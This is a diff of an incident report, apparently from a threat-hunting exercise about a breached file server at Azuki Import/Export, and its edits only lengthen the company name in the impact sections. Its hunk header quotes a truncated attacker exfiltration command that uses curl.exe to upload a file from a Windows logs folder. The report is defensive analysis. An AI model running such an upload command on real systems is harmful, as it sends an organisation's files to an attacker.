@@ -51,10 +51,10 @@ Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\C
 - The compromised device `azuki-fileserver01` which housed sensitive employee information, has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.
 
 ### Business Partners:
-- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may have ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export.
+- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may have ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.
 
 ### Regulatory Bodies:
-- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.
+- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.
 
 ### Shareholders:
 - This incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of remedial actions taken and the company's ability to restore stakeholder confidence.
